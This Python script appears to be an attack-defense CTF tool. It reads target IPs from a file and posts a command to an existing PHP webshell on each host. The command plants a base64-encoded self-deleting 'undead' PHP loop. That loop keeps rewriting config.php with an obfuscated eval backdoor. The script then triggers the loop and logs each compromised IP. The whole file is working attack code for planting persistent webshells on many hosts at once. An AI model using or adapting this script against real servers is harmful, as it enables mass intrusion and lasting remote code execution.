#coding=utf-8
import requests
import re
shell_addr="/cmd.php"
passwd="cmd"                    #木马密码
port="81"
payload =  {passwd: 'file_put_contents(\'st4ck.php\',base64_decode(\'PD9waHANCnNldF90aW1lX2xpbWl0KDApOw0KaWdub3JlX3VzZXJfYWJvcnQoMSk7DQp1bmxpbmsoX19GSUxFX18pOw0Kd2hpbGUoMSl7CQ0KCXNsZWVwKDUpOwkNCglpZihmaWxlX2V4aXN0cygnY29uZmlnLnBocCcpKXsJCQ0KCQlpZihtZDVfZmlsZSgnY29uZmlnLnBocCcpPT09J2NiMTM3OTk3NmQ0NGU3MDRiOTI5NDQ3M2Q3Yjk0ZDA5Jyl7DQoJCQkNCgkJfWVsc2V7DQoJCQlmaWxlX3B1dF9jb250ZW50cygnY29uZmlnLnBocCcsYmFzZTY0X2RlY29kZSgnUEQ5UVNGQU5DbVZXWVd3Z0tDQm5lbWx1Um14aGRHVWdLQ0JpWVhObE5qUmZaRVZqYjJSbElDZ25VM2t4VEhwT1JsRnBVUzkzUkhjMlNsWnJMMDlVVmtkUU1XSlJSMEZCUFQwbktTQXBJQ2svUGc9PScpKTsNCgkJfQkJCQ0KCX1lbHNlew0KCQlmaWxlX3B1dF9jb250ZW50cygnY29uZmlnLnBocCcsYmFzZTY0X2RlY29kZSgnUEQ5UVNGQU5DbVZXWVd3Z0tDQm5lbWx1Um14aGRHVWdLQ0JpWVhObE5qUmZaRVZqYjJSbElDZ25VM2t4VEhwT1JsRnBVUzkzUkhjMlNsWnJMMDlVVmtkUU1XSlJSMEZCUFQwbktTQXBJQ2svUGc9PScpKTsNCgl9DQp9DQo/Pg==\'));'}

ippath="ip.txt"
pattern = re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b")
iptables = ""
with open(ippath, 'r') as file_to_read:
    while True:
        lines = file_to_read.readline() 
        if not lines:
            break
            pass
        iptables+=lines  
#print(iptables)
iplist=pattern.findall(iptables)

#密码cmd-路径是config点php
#
flag=open("config_php_passwd_cmd.txt","a")

for ip in iplist:
    url="http://"+ip+":"+port+shell_addr
    #print(url)
    try:
        res=requests.post(url,payload,timeout=1)
        #print(res)
        if res.status_code == requests.codes.ok:
            result = url+" write nodie correct ,passwd is cmd path is ./config.php "
            print(result,end="")
            flag.write(ip+"\n")
        else:
            print ("shell 404")
    except Exception as e:
        print(url+" connect shell fail")
        raise e
    try:
        requests.get("http://"+ip+":"+port+"/st4ck.php",timeout=1)
        print("激活成功")
    except Exception as e:
        print("激活成功")



flag.close()